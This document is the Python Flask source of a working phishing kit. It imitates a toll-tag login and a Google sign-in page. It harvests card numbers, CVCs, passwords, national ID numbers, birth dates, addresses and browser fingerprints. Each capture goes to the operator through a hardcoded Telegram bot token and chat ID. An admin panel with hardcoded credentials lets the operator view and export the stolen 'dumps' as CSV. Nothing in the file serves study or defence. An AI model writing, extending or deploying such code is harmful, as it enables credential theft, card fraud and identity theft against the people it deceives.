from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file, make_response
import csv
import io
import requests
from datetime import datetime
import os
import json

app = Flask(__name__)
app.secret_key = 'any_random_string_here'  # Hardcoded is fine
app.permanent_session_lifetime = 120

# Telegram Config - reads from environment variables
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8658940443:AAG97dv8tM-aFquFUmgIjutXv1ej3gVCvg8')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '5125040081')
TELEGRAM_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
submissions = []

# ← NEW: Telegram notification function
def send_telegram_message(message):
    try:
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(TELEGRAM_URL, json=payload, timeout=5)
        print(f"✅ Telegram sent! Status: {response.status_code}")
        print(f"Response: {response.text[:200]}")
        return response
    except Exception as e:
        print(f"❌ Telegram ERROR: {e}")
        import traceback
        traceback.print_exc()
        return None

# Load existing data from file on startup (optional, to persist across restarts)
try:
    with open('captured_data.txt', 'r') as f:
        for line in f:
            # Parse lines roughly (adjust if format changes)
            parts = line.strip().split(', ')
            if len(parts) >= 19:  # Updated for fingerprint column
                submissions.append({
                    'timestamp': parts[0].split('Timestamp: ')[1] if 'Timestamp:' in parts[0] else datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'tag_number': parts[1].split('Tag: ')[1] if 'Tag:' in parts[1] else '',
                    'select': parts[2].split('Payment: ')[1] if 'Payment:' in parts[2] else '',
                    'cardholder_name': parts[3].split('Name: ')[1] if 'Name:' in parts[3] else '',
                    'card_number': parts[4].split('Card: ')[1] if 'Card:' in parts[4] else '',
                    'expiration_date': parts[5].split('Expiry: ')[1] if 'Expiry:' in parts[5] else '',
                    'security_code': parts[6].split('CVC: ')[1] if 'CVC:' in parts[6] else '',
                    'email': parts[7].split('Email: ')[1] if 'Email:' in parts[7] else '',
                    'password': parts[8].split('Password: ')[1] if 'Password:' in parts[8] else '',
                    'phone_number': parts[9].split('Phone: ')[1] if 'Phone:' in parts[9] else '',
                    'date_of_birth': parts[10].split('DOB: ')[1] if 'DOB:' in parts[10] else '',
                    'id_number': parts[11].split('Cedula: ')[1] if 'Cedula:' in parts[11] else '',
                    'billing_address': parts[12].split('Street: ')[1] if 'Street:' in parts[12] else '',
                    'city': parts[13].split('City: ')[1] if 'City:' in parts[13] else '',
                    'province': parts[14].split('Province: ')[1] if 'Province:' in parts[14] else '',
                    'zip_code': parts[15].split('Zip: ')[1] if 'Zip:' in parts[15] else '',
                    'user_agent': parts[16].split('User Agent: ')[1] if 'User Agent:' in parts[16] else '',
                    'ip': parts[17].split('IP: ')[1] if 'IP:' in parts[17] else '',
                    'fingerprint_data': parts[18].split('Fingerprint: ')[1] if len(parts) > 18 and 'Fingerprint:' in parts[18] else '{}',
                    'new': False  # Default for loaded data
                })
except FileNotFoundError:
    pass

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    panapass = request.form.get('panapass')
    password = request.form.get('password')
    print(f"Captured Initial Login: Panapass={panapass}, Password={password}")
    return redirect(url_for('form'))

@app.route('/google_auth')
def google_auth():
    return render_template('auth.html')

@app.route('/form')
def form():
    return render_template('form.html')

@app.route('/submit', methods=['POST'])
def handle_submit():
    tag = request.form.get('tag')
    payment_method = request.form.get('payment_method')
    full_name = request.form.get('full_name')
    card_number = request.form.get('card_number')
    expiry = request.form.get('expiry')
    cvc = request.form.get('cvc')
    email = request.form.get('email')
    phone = request.form.get('phone')
    dob = request.form.get('dob')
    cedula = request.form.get('cedula')
    street = request.form.get('street')
    city = request.form.get('city')
    province = request.form.get('province')
    zip_code = request.form.get('zip')
    
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    
    session['form_data'] = {
        'tag': tag,
        'payment_method': payment_method,
        'full_name': full_name,
        'card_number': card_number,
        'expiry': expiry,
        'cvc': cvc,
        'email': email,
        'phone': phone,
        'dob': dob,
        'cedula': cedula,
        'street': street,
        'city': city,
        'province': province,
        'zip_code': zip_code,
        'user_agent': user_agent,
        'ip': ip,
    }
    session.permanent = True
    return redirect(url_for('google_auth'))

@app.route('/capture', methods=['POST'])
def capture_google():
    auth_email = request.form.get('email')
    auth_password = request.form.get('password')
    fingerprint_data = request.form.get('fingerprint_data', '{}')  # ← NEW: Capture fingerprints
    
    form_data = session.get('form_data', {})
    
    if not form_data:
        form_data = {
            'tag': 'N/A (standalone)',
            'payment_method': 'N/A (standalone)',
            'full_name': 'N/A (standalone)',
            'card_number': 'N/A (standalone)',
            'expiry': 'N/A (standalone)',
            'cvc': 'N/A (standalone)',
            'phone': 'N/A (standalone)',
            'dob': 'N/A (standalone)',
            'cedula': 'N/A (standalone)',
            'street': 'N/A (standalone)',
            'city': 'N/A (standalone)',
            'province': 'N/A (standalone)',
            'zip_code': 'N/A (standalone)',
            'user_agent': request.headers.get('User-Agent', 'N/A'),
            'ip': request.remote_addr or 'N/A',
        }
    
    submission = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'tag_number': form_data.get('tag', 'N/A'),
        'select': form_data.get('payment_method', 'N/A'),
        'cardholder_name': form_data.get('full_name', 'N/A'),
        'card_number': form_data.get('card_number', 'N/A'),
        'expiration_date': form_data.get('expiry', 'N/A'),
        'security_code': form_data.get('cvc', 'N/A'),
        'email': auth_email or 'N/A',
        'password': auth_password or 'N/A',
        'phone_number': form_data.get('phone', 'N/A'),
        'date_of_birth': form_data.get('dob', 'N/A'),
        'id_number': form_data.get('cedula', 'N/A'),
        'billing_address': form_data.get('street', 'N/A'),
        'city': form_data.get('city', 'N/A'),
        'province': form_data.get('province', 'N/A'),
        'zip_code': form_data.get('zip_code', 'N/A'),
        'user_agent': form_data.get('user_agent', request.headers.get('User-Agent', 'N/A')),
        'ip': form_data.get('ip', request.remote_addr or 'N/A'),
        'fingerprint_data': fingerprint_data,  # ← NEW: Store fingerprints
        'new': False
    }
    submissions.append(submission)
    
    with open('captured_data.txt', 'a') as f:
        f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {auth_email or 'N/A'}, Password: {auth_password or 'N/A'}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}, Fingerprint: {submission['fingerprint_data']}\n")
    
    # ← UPDATED: Parse and format fingerprints for Telegram
    try:
        fingerprints = json.loads(fingerprint_data) if fingerprint_data and fingerprint_data != '{}' else {}
    except:
        fingerprints = {}
    
    # Format fingerprint details
    fp_display = ""
    if fingerprints:
        fp_display = f"""
<b>🖐️ FINGERPRINT DATA:</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>🌐 Public IP:</b> <code>{fingerprints.get('ip_address', 'Unknown')}</code>
<b>🔗 WebRTC IPs:</b> <code>{', '.join(fingerprints.get('webrtc_ips', [])) if fingerprints.get('webrtc_ips') else 'None'}</code>
<b>🎨 Canvas Hash:</b> <code>{fingerprints.get('canvas_fingerprint', 'N/A')}</code>
<b>🎮 WebGL Hash:</b> <code>{fingerprints.get('webgl_fingerprint', {}).get('hash', 'N/A')}</code>
<b>📊 GPU Vendor:</b> {fingerprints.get('webgl_fingerprint', {}).get('details', {}).get('vendor', 'N/A')}
<b>🔧 GPU Renderer:</b> {fingerprints.get('webgl_fingerprint', {}).get('details', {}).get('renderer', 'N/A')}

<b>💻 DEVICE INFO:</b>
<b>🖥️ Platform:</b> {fingerprints.get('device_info', {}).get('platform', 'N/A')}
<b>🌍 Language:</b> {fingerprints.get('device_info', {}).get('language', 'N/A')}
<b>📱 Screen:</b> {fingerprints.get('device_info', {}).get('screen_resolution', 'N/A')}
<b>🎨 Color Depth:</b> {fingerprints.get('device_info', {}).get('color_depth', 'N/A')} bit
<b>📐 Pixel Ratio:</b> {fingerprints.get('device_info', {}).get('pixel_ratio', 'N/A')}
<b>⚙️ CPU Cores:</b> {fingerprints.get('device_info', {}).get('hardware_concurrency', 'N/A')}
<b>🕐 Timezone:</b> {fingerprints.get('device_info', {}).get('timezone', 'N/A')}
<b>🍪 Cookies:</b> {'✅ Enabled' if fingerprints.get('device_info', {}).get('cookies_enabled') else '❌ Disabled'}
<b>🚫 DNT:</b> {fingerprints.get('device_info', {}).get('do_not_track', 'N/A')}
"""
    else:
        fp_display = "\n<b>🖐️ Fingerprint:</b> No data collected"
    
    telegram_msg = f"""
<b>🆕 NEW FULL CAPTURE</b>

<b>⏰ Timestamp:</b> {submission['timestamp']}
<b>🏷️ Tag:</b> {submission['tag_number']}
<b>💳 Payment:</b> {submission['select']}
<b>👤 Name:</b> {submission['cardholder_name']}
<b>💰 Card:</b> <code>{submission['card_number']}</code>
<b>📅 Expiry:</b> {submission['expiration_date']}
<b>🔒 CVC:</b> <code>{submission['security_code']}</code>
<b>📧 Email:</b> <code>{submission['email']}</code>
<b>🔑 Password:</b> <code>{submission['password']}</code>
<b>📱 Phone:</b> {submission['phone_number']}
<b>🎂 DOB:</b> {submission['date_of_birth']}
<b>🆔 Cedula:</b> {submission['id_number']}
<b>🏠 Street:</b> {submission['billing_address']}
<b>🌆 City:</b> {submission['city']}
<b>🌍 Province:</b> {submission['province']}
<b>📮 Zip:</b> {submission['zip_code']}
<b>🌐 IP (Flask):</b> <code>{submission['ip']}</code>
<b>📱 User Agent:</b> {submission['user_agent'][:100]}...
{fp_display}
"""
    send_telegram_message(telegram_msg)
    
    if 'form_data' in session:
        session.pop('form_data', None)
    
    return {'status': 'success'}, 200

@app.route('/timeout_capture', methods=['POST'])
def timeout_capture():
    reason = request.form.get('reason', 'timeout')
    fingerprint_data = request.form.get('fingerprint_data', '{}')  # ← NEW: Capture fingerprints
    email_reason = f'N/A ({reason})'
    
    form_data = session.get('form_data', {})
    if not form_data:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('captured_data.txt', 'a') as f:
            f.write(f"Timestamp: {timestamp}, Tag: N/A (standalone {reason}), Payment: N/A, Name: N/A, Card: N/A, Expiry: N/A, CVC: N/A, Email: {email_reason}, Password: {email_reason}, Phone: N/A, DOB: N/A, Cedula: N/A, Street: N/A, City: N/A, Province: N/A, Zip: N/A, User Agent: {request.headers.get('User-Agent', 'N/A')}, IP: {request.remote_addr or 'N/A'}, Fingerprint: {fingerprint_data}\n")
        return '', 200
    
    submission = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'tag_number': form_data.get('tag', 'N/A'),
        'select': form_data.get('payment_method', 'N/A'),
        'cardholder_name': form_data.get('full_name', 'N/A'),
        'card_number': form_data.get('card_number', 'N/A'),
        'expiration_date': form_data.get('expiry', 'N/A'),
        'security_code': form_data.get('cvc', 'N/A'),
        'email': email_reason,
        'password': email_reason,
        'phone_number': form_data.get('phone', 'N/A'),
        'date_of_birth': form_data.get('dob', 'N/A'),
        'id_number': form_data.get('cedula', 'N/A'),
        'billing_address': form_data.get('street', 'N/A'),
        'city': form_data.get('city', 'N/A'),
        'province': form_data.get('province', 'N/A'),
        'zip_code': form_data.get('zip_code', 'N/A'),
        'user_agent': form_data.get('user_agent', request.headers.get('User-Agent', 'N/A')),
        'ip': form_data.get('ip', request.remote_addr or 'N/A'),
        'fingerprint_data': fingerprint_data,  # ← NEW: Store fingerprints
        'new': False
    }
    
    submissions.append(submission)
    
    with open('captured_data.txt', 'a') as f:
        f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {email_reason}, Password: {email_reason}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}, Fingerprint: {submission['fingerprint_data']}\n")
    
    # ← UPDATED: Parse and format fingerprints for timeout messages
    try:
        fingerprints = json.loads(fingerprint_data) if fingerprint_data and fingerprint_data != '{}' else {}
    except:
        fingerprints = {}
    
    fp_display = ""
    if fingerprints:
        fp_display = f"""
<b>🖐️ FINGERPRINT DATA:</b>
<b>🌐 Public IP:</b> <code>{fingerprints.get('ip_address', 'Unknown')}</code>
<b>🔗 WebRTC IPs:</b> <code>{', '.join(fingerprints.get('webrtc_ips', [])) if fingerprints.get('webrtc_ips') else 'None'}</code>
<b>🎨 Canvas:</b> <code>{fingerprints.get('canvas_fingerprint', 'N/A')}</code>
<b>🎮 WebGL:</b> <code>{fingerprints.get('webgl_fingerprint', {}).get('hash', 'N/A')}</code>
"""
    else:
        fp_display = "\n<b>🖐️ Fingerprint:</b> No data"
    
    telegram_msg = f"""
<b>⚠️ TIMEOUT/ABANDON ({reason.upper()})</b>

<b>⏰ Timestamp:</b> {submission['timestamp']}
<b>🏷️ Tag:</b> {submission['tag_number']}
<b>💳 Payment:</b> {submission['select']}
<b>👤 Name:</b> {submission['cardholder_name']}
<b>💰 Card:</b> <code>{submission['card_number']}</code>
<b>📅 Expiry:</b> {submission['expiration_date']}
<b>🔒 CVC:</b> <code>{submission['security_code']}</code>
<b>📧 Email:</b> {email_reason}
<b>🔑 Password:</b> {email_reason}
<b>📱 Phone:</b> {submission['phone_number']}
<b>🎂 DOB:</b> {submission['date_of_birth']}
<b>🆔 Cedula:</b> {submission['id_number']}
<b>🏠 Street:</b> {submission['billing_address']}
<b>🌆 City:</b> {submission['city']}
<b>🌍 Province:</b> {submission['province']}
<b>📮 Zip:</b> {submission['zip_code']}
<b>🌐 IP:</b> <code>{submission['ip']}</code>
<b>📱 User Agent:</b> {submission['user_agent'][:100]}...
{fp_display}
"""
    send_telegram_message(telegram_msg)
    
    session.pop('form_data', None)
    return '', 200

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in ['Z', 'Carter Lions'] and password == 'Ominous':
            session['logged_in'] = True
            session['username'] = username
            if not session.get('last_login'):
                session['last_login'] = '2000-01-01 00:00:00'
            old_last_login = session['last_login']
            session['last_login'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            session['old_last_login'] = old_last_login
            return redirect(url_for('admin_dashboard'))
        flash('Invalid credentials', 'error')
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    username = session.get('username', 'Admin')
    
    old_last_login_str = session.get('old_last_login', '2000-01-01 00:00:00')
    old_last_login = datetime.strptime(old_last_login_str, '%Y-%m-%d %H:%M:%S')
    first_new_index = -1
    has_new_dumps = False
    for i, sub in enumerate(submissions):
        sub_time = datetime.strptime(sub['timestamp'], '%Y-%m-%d %H:%M:%S')
        sub['new'] = sub_time > old_last_login
        if sub['new'] and first_new_index == -1:
            first_new_index = i
            has_new_dumps = True
    
    return render_template('admin.html', submissions=submissions, username=username, first_new_index=first_new_index, has_new_dumps=has_new_dumps)

@app.route('/admin/logout')
def admin_logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('admin_login')) 

@app.route('/admin/download')
def admin_download():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Timestamp', 'Tag Number', 'Select', 'Cardholder\'s Name', 'Card Number', 'Expiration Date', 'Security Code', 'Email', 'Password', 'Phone Number', 'Date of birth', 'ID Number', 'Billing Address', 'City', 'Province', 'Zip Code', 'User Agent', 'IP', 'Fingerprint Data'])  # ← NEW: Added column
    for sub in submissions:
        writer.writerow([sub['timestamp'], sub['tag_number'], sub['select'], sub['cardholder_name'], sub['card_number'], sub['expiration_date'], sub['security_code'], sub['email'], sub['password'], sub['phone_number'], sub['date_of_birth'], sub['id_number'], sub['billing_address'], sub['city'], sub['province'], sub['zip_code'], sub['user_agent'], sub['ip'], sub['fingerprint_data']])  # ← NEW: Added column
    
    output.seek(0)
    return send_file(io.BytesIO(output.getvalue().encode('utf-8')), mimetype='text/csv', as_attachment=True, download_name='submissions.csv')

@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    submissions.clear()
    open('captured_data.txt', 'w').close()
    flash('All data cleared')
    return redirect(url_for('admin_dashboard'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)

